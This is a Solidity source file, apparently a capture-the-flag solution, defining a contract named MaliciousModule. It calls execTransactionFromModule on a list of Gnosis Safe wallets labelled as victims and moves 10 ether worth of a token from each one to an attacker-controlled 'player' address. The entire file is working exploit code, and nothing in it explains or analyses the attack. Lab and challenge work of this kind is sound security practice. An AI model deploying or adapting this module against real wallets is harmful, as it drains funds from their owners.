// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";


contract MaliciousModule {

    address private token;
    address private player;

    constructor(address _token, address _player) {
        token = _token;
        player = _player;
    }

    function execute(address payable [] memory _victimWallets) public {
        address payable [] memory victimWallets = _victimWallets;
        bytes memory _data = abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), player, 10 ether);
        for (uint256 i = 0; i < victimWallets.length; i++) {
            GnosisSafe(victimWallets[i]).execTransactionFromModule(token, 0, _data, Enum.Operation.Call);
        }
    }
}